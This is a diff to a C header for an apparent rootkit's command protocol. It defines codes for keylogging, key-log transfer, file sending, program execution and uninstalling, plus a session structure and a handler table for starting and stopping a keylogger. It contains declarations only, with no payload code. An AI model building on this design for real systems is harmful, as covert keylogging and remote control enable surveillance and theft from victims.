@@ -1,10 +1,14 @@
 #ifndef ROOTKIT_PROTOCOL_H
 #define ROOTKIT_PROTOCOL_H
 
+#include <stddef.h>
+#include <stdint.h>
 #include "utils/utils.h"
 
+#define COMMAND_TRIGGER_THRESHOLD 2
+
 enum command_codes {
-    START_KEYLOGGER = 0x09,
+    START_KEYLOGGER = 0x01,
     STOP_KEYLOGGER,
     KEY_LOG_TRANSFER,
     SEND_FILE,
@@ -13,15 +17,49 @@ enum command_codes {
     WATCH_CHANGED,
     RUN_PROGRAM,
     UNINSTALL,
-    DISCONNECT
+    DISCONNECT,
+    UNKNOWN
 };
 
 struct packet_data {
-    char data[2];
+    uint16_t data;
+    struct packet_data * next;
+};
+
+struct session_info {
+    struct packet_data * head;
+    int command_counter; // The number of times a command was encountered
+    enum command_codes last_command_code;
+    int packet_index;
+    int last_command_index;
+
+    _Atomic bool run_keylogger;
+};
+
+// Function typedef
+typedef void (*command_handler)(struct session_info * session_info);
+
+// Key Pair Object
+typedef struct {
+    int key;
+    command_handler handler;
+} key_pair;
+
+// Handler Functions
+void start_keylogger(struct session_info * session_info);
+void stop_keylogger(struct session_info * session_info);
+
+//  Map of command codes and handler functions
+static const key_pair command_handler_functions[] = {
+    { START_KEYLOGGER,  start_keylogger },
+    { STOP_KEYLOGGER, stop_keylogger },
+    { 0, NULL }
 };
 
 
-int handle_packet_data(struct packet_data packets[], int data);
+
+
+void handle_packet_data(struct session_info * session_info, uint16_t data);
 
 // Keylogger
 void send_start_keylogger(int fd);
